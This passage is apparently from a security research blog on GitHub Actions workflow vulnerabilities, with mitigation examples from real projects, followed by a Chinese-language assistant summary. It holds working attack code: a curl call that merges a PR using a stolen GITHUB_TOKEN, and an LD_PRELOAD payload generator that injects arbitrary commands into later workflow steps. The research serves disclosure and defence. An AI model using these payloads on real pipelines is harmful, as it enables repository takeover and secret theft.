const str = `# Merge PR
curl -X PUT \
    https://api.github.com/repos/mousefluff/terraform-cdk-action/pulls/2/merge \
    -H "Accept: application/vnd.github.v3+json" \
    --header "authorization: Bearer ${process.env.INPUT_GITHUBTOKEN}" \
    --header 'content-type: application/json' \
    -d '{"commit_title":"pwned"}'`;

execSync(str, { stdio: 'inherit' });

run().catch((error) => {
  core.setFailed(error.message);
});
We tested this on a copy of the original repo, so we won’t tamper with it. Since the pull_request_target trigger has write permissions to the base repo by default and it wasn’t restricted in any way or fashion, we were able to merge a PR with the compromised token successfully:


And we can see that the PR was successfully merged by the github-actions[bot]:


How to secure your pipelines
Securing Github Actions workflows depends on the implementation, and that can vary significantly. Different trigger scenarios require different safeguards. Let’s explore the various issues we’ve detailed and offer potential ways to mitigate them with some concrete examples for reference.

Avoid running privileged workflows on untrusted code — when using the pull_request_target or workflow_run triggers, do not checkout code from forked repos unless you have to. Meaning - ref shouldn’t point to the likes of github.event.pull_request.head.ref or github.event.workflow_run.head_sha. Since these triggers run in the context of the base repo with read/write permissions granted to the GITHUB_TOKEN by default and access to secrets, compromising these workflows is especially dangerous.

If checking out the code is a must, here are some additional safety measures:

Validate the triggering repo/user: Add an if condition to the checkout step to limit the triggering party:

jobs:
  validate_email:
    permissions:
      pull-requests: write
    runs-on: ubuntu-latest
    if: github.repository == 'llvm/llvm-project'
    steps:
      - name: Fetch LLVM sources
        uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}
Taken from llvm/llvm-project. Notice the if condition that checks if the triggering Github repo is the base repo, thus blocking PRs triggered by forks.

Here’s another example, this time by checking that the user that created the PR is a trusted one:

jobs:
  merge-dependabot-pr:
    runs-on: ubuntu-latest
    if: github.actor == 'dependabot[bot]'
    steps:

      - uses: actions/checkout@v4
        with:
          show-progress: false
          ref: ${{ github.event.pull_request.head.sha }}
In spring-projects/spring-security, github.actor is checked for Dependabot, thus blocking PRs originating from other users from running the job.

Run the workflow only after manual validation: This can be done by adding a label to the PR.

name: Benchmark

on:
  pull_request_target:
    types: [labeled]

jobs:
  benchmark:
    if: ${{ github.event.label.name == 'benchmark' }}
    runs-on: ubuntu-latest
...
    steps:
      - uses: actions/checkout@v4
        with:
          persist-credentials: false
          ref: ${{github.event.pull_request.head.sha}}
          repository: ${{github.event.pull_request.head.repo.full_name}}
This example taken from fastify/fastify shows a workflow triggered by a PR only when it’s labeled with “benchmark.” These if-condition statements can be applied both on the job and on a specific step level.

Check that the triggering repo matches the base repo: This is another way to restrict PRs originating from forked repos. For a workflow that triggers on pull_request_target, let’s look at the following if condition:

jobs:
  deploy:
    name: Build & Deploy
    runs-on: ubuntu-latest
    if: >
      (github.event_name == 'pull_request_target' && contains(github.event.pull_request.labels.*.name, 'impact/docs'))
      || (github.event_name != 'pull_request' && github.event.pull_request.head.repo.full_name == github.repository)
As can be seen in python-poetry/poetry, notice the check that github.event.pull_request.head.repo.full_name coming from the PR event context matches the base repo github.repository.

Similarly, for a workflow that triggers on workflow_run, this will look like:

jobs:
  publish-latest:
    runs-on: ubuntu-latest
    if: ${{ (github.event.workflow_run.conclusion == 'success') && (github.event.workflow_run.head_repository.full_name == github.repository) }}
As demonstrated in TwiN/gatus.

Treat actions the same as you would 3rd-party dependencies. Anyone familiar with the open source world and developer security hopefully knows by now the dangers of using packages stored in public code registries. Actions are the Github Actions’ dependency counterpart. If you’re using one, make sure to vet the repo that stores it. Once done, you can pin the action to a commit hash (a version tag is not good enough) to make sure that Github Actions will not pull a new version of it once it’s updated. This ensures that if the action gets compromised, you won’t suffer the consequences. An action can be pinned by using the @ sign after the action’s name:

steps:
      - uses: actions/checkout@9bb56186c3b09b4f86b1c65136769dd318469633 # v4.1.2
Handling untrusted artifacts in Github Actions: Artifacts generated by workflows running on untrusted code should be treated with the same caution as user-controlled code, as they can potentially serve as an entry point for attackers into a privileged workflow. To mitigate this risk, when downloading artifacts using the github/download-artifact action, always specify a path parameter. This ensures the contents are extracted to a designated directory, preventing any accidental overwriting of files in the job’s root directory that could later be executed in a privileged context. Additionally, developers should ensure that the contents of these artifacts are properly escaped and sanitized before being used in any sensitive operations. By taking these precautions, you can significantly reduce the risk of introducing vulnerabilities through untrusted artifacts.

Restrict the code that runs on self-hosted runners: By default, PRs coming from forked repos need approval to execute workflows if the owner is a first-time contributor to the repo. If they’ve already contributed code, in as little as fixing a typo, the workflows will run automatically on their PRs. Obviously, this is an easy hurdle to pass, so the first recommendation is to set that setting to require approval for all external contributors:


There’s also a hardening tool by step-security/harden-runner designed to be the first step in any job in a workflow. A word of caution - hardening RCE-as-a-service solutions is not an easy task to accomplish so using this might not be without risk.

Adhering to the least privilege principle: In the worst case, a workflow gets compromised, an attacker can run arbitrary code. Restricting the permissions of the GITHUB_TOKEN can be the last line of defense preventing an attacker from fully taking over a repo. This can be done globally in the repo’s settings, for each workflow, or even for jobs in the YAML config file. Special attention should be given to workflows that trigger on events like pull_request_target and workflow_run that have full read/write access to the base repo by default.

Community tool: Github Actions scanner
In order to scan issues in your Github Actions workflows and actions, we created a CLI tool — Github Actions Scanner. Given a Github repo or an org, it’ll parse all the YAML config files and use a regex-based rule engine to flag findings. It also has features that can facilitate exploitation:

Auto creation of a copy of the target repo: If an issue is found and requires some additional validation or developing an exploit, we don’t want to do this on the target repo to avoid affecting the actual code and the risk of exposing the issue before it was responsibly disclosed and fixed. As a result, we can create a fresh copy of the repo on a Github user or org of choice to perform isolated testing.

LD_PRELOAD payload generation: When command injection is possible, using LD_PRELOAD to compromise subsequent steps is usually a great way to take over a workflow. Thus, we have created a proof-of-concept (POC) generator based on the following template:

const ldcode = Buffer.from(`#include <stdlib.h>
void __attribute__((constructor)) so_main() { unsetenv("LD_PRELOAD"); system("${command.replace("\"", "\\\"")}"); }
`)
     const code = Buffer.from(`echo ${ldcode.toString("base64")} | base64 -d | cc -fPIC -shared -xc - -o $GITHUB_WORKSPACE/ldpreload-poc.so; echo "LD_PRELOAD=$GITHUB_WORKSPACE/ldpreload-poc.so" >> $GITHUB_ENV`)
It implements the following steps:

Create a small Base64 encoded C program that invokes the system syscall on a command specified by the user.

Decode and compile it to a shared object in the $GITHUB_WORKSPACE root dir.

Set LD_PRELOAD to the shared object and load it into the GITHUB_ENV.

Conclusion
In this research, we provided an overview of Github Actions-related vulnerabilities and security hazards. Due to the multitude of options and the need for clarity in the official documentation, developers are still getting these wrong, resulting in compromised CI/CD pipelines. Make no mistake, misconfigured and outright vulnerable workflows are not unique to Github Actions, and special care must be taken to secure them. As modern supply chain scanners and static analyzers still can fail to detect these, developers must adhere to safe best practices. We created an open source tool to help fill in the gaps and flag potential issues. As more research is done in this area, this blog and others can help drive the developers’ focus and educate them so that the occurrence of these bugs diminishes.

---

**Assistant:** 以下是对 GitHub Actions 漏洞的简化说明，并附带实际示例和代码，方便理解：
## **GitHub Actions 简介**
GitHub Actions 是一个自动化工作流程的工具，可以自动完成代码构建、测试和部署等任务。它通过 *事件* 触发，例如代码提交或 Pull Request (PR)。一个工作流程由一个或多个 *作业* 组成，这些作业在虚拟机 (Runner) 上运行。每个作业包含一系列 *步骤*，每个步骤可以执行脚本或 *Action*。Action 是可重用的代码单元，可以从 GitHub Marketplace 或任何 GitHub 仓库获取。
### 基本概念:
- **工作流程 (Workflow):** 定义自动化流程的 YAML 文件，通常位于 `.github/workflows/` 目录下。
- **事件 (Event):** 触发工作流程的条件，例如 `pull_request` (当有新的 PR 时) 或 `push` (当代码被推送到仓库时)。
- **作业 (Job):** 在 Runner 上执行的一系列步骤。
- **步骤 (Step):** 工作流程中的一个独立任务，例如运行命令或使用 Action。
- **Action:** 可重用的步骤，可以是 Docker 镜像、JavaScript 代码或复合 Action。
- **Runner:** 运行作业的虚拟机。GitHub 提供托管 Runner，也可以使用自托管 Runner。
### 示例：一个简单的工作流程
textname: 问候语
on:
push:
branches: [ "main" ]  # 当代码推送到 main 分支时触发
jobs:
greet:
runs-on: ubuntu-latest  # 在 Ubuntu 系统上运行
steps:
- name: 打印问候语
run: echo "你好，世界！"
这个工作流程会在代码推送到 `main` 分支时触发，然后在 Ubuntu 系统上运行一个作业，该作业会打印 "你好，世界！"。
## **身份验证和密钥**
GitHub Actions 会自动生成一个 `GITHUB_TOKEN` 密钥，用于在工作流程中进行身份验证。这个令牌具有读写权限，可以用来修改仓库内容或调用 GitHub API。此外，还可以将敏感信息（例如 API 密钥）作为 *Secrets* 传递给工作流程。
### Secrets 的使用示例
textname: 使用密钥的工作流程
on:
push:
branches: [ "main" ]
jobs:
deploy:
runs-on: ubuntu-latest
env:
API_KEY: ${{ secrets.MY_API_KEY }}  # 从 Secrets 中获取 API 密钥
steps:
- name: 部署应用
run: echo "使用 API 密钥: $API_KEY" #  部署命令
## **常见漏洞场景**
## **Pwn Request (Pull Request 权限提升)**
当工作流程使用 `pull_request_target` 事件时，如果未正确验证输入，攻击者可能利用 PR 篡改工作流程，从而获取敏感信息或执行恶意代码。
### 触发条件:
- 工作流程使用 `pull_request_target` 事件。
- 从 Fork 的仓库显式检出代码，如:
textuses: actions/checkout@v2
with:
ref: ${{ github.event.pull_request.head.sha }}
- 存在代码执行或注入点，攻击者可以控制执行的代码。
### 防范措施:
- 避免在不受信任的代码上运行特权工作流程。
- 验证触发仓库/用户：检查 `github.repository` 是否为预期值，或 `github.actor` 是否为可信用户。
- 仅在手动验证后运行工作流程：添加标签 (label) 或其他人工审批机制。
### 实际案例:
terraform-cdk-action 仓库存在此漏洞。攻击者可以通过 PR 修改 `package.json` 文件，在 `npm install` 步骤中执行恶意代码，窃取 `GITHUB_TOKEN` 或 `TF_API_TOKEN`。
textname: terraform-cdk-action
description: The Terraform CDK GitHub Action allows you to run CDKTF as part of your CI/CD workflow.
runs:
using: node20
main: dist/index.js
攻击者可以修改 index.ts 文件，植入恶意代码。
## `workflow_run` 权限提升
`workflow_run` 事件用于在其他工作流程完成后触发新的工作流程。如果后续工作流程检出 (checkout) 了攻击者控制的代码，则可能导致权限提升。
### 触发条件:
- 攻击者可以控制触发工作流程。
- 后续工作流程使用 `workflow_run` 事件触发，并检出攻击者控制的代码。
textuses: actions/checkout@v4
with:
repository: ${{ github.event.workflow_run.head_repository.full_name }}
ref: ${{ github.event.workflow_run.head_sha }}
fetch-depth: 0
- 存在代码执行或注入点。
### 防范措施:
- 类似于 `pull_request_target`，避免检出不受信任的代码。
- 验证触发仓库：确保 `github.event.workflow_run.head_repository.full_name` 与预期仓库匹配。
## **不安全的文件下载**
如果工作流程下载并使用了不受信任的 Artifact (构建产物)，可能导致安全问题。攻击者可以上传恶意 Artifact，并在后续步骤中利用它执行代码。
### 示例：
攻击者创建一个 PR，替换 `package.json` 通过 `npm install` 执行恶意代码，然后将包含恶意代码的文件上传为 Artifact。在下载 Artifact 的工作流程中，恶意代码可能被执行。
### 防范措施:
- 始终指定 `path` 参数来限定 Artifact 的解压目录，防止覆盖重要文件。
- 在使用 Artifact 之前，对其内容进行转义和清理。
## **自托管 Runner 的风险**
自托管 Runner 提供了更大的灵活性，但也带来了更高的安全风险。如果 Runner 被攻破，攻击者可以持久化存在，并影响其他工作流程。
### 防范措施:
- 限制在公共仓库中使用自托管 Runner。
- 使用 `step-security/harden-runner` 工具加固 Runner。
- 定期审查和更新 Runner 的安全配置。
## **Action 本身的漏洞**
Action 本身也可能存在漏洞，例如命令注入。如果攻击者可以控制 Action 的输入，则可能利用这些漏洞执行任意代码。
### 防范措施:
- 像对待第三方依赖项一样，谨慎选择 Action。
- 锁定 Action 的版本到具体的 Commit Hash，而不是 Version Tag。
- 审查 Action 的代码，确保其安全性。
## **利用技巧**
- **代码或命令注入:** 通过修改 `package.json`、替换 Action 代码或利用其他注入点执行代码。
- **环境变量注入:** 使用 `LD_PRELOAD` 劫持系统调用，执行恶意代码。
### 示例：LD_PRELOAD 注入
攻击者可以创建一个包含恶意代码的共享对象，并通过 `LD_PRELOAD` 环境变量加载它。当程序调用被劫持的函数时，恶意代码将被执行。
## **如何保护你的 Pipeline**
- **避免在不受信任的代码上运行特权工作流程。**
- **验证触发仓库/用户。**
- **仅在手动验证后运行工作流程。**
- **像对待第三方依赖项一样，谨慎选择 Action。**
- **锁定 Action 的版本到具体的 Commit Hash。**
- **安全地处理 Artifact。**
- **限制自托管 Runner 的使用。**
- **遵循最小权限原则：限制 GITHUB_TOKEN 的权限。**
## **GitHub Actions Scanner 工具**
为了帮助检测 GitHub Actions 工作流程中的问题，可以使用 GitHub Actions Scanner 工具。它可以扫描 YAML 配置文件，并根据规则标记潜在的安全风险。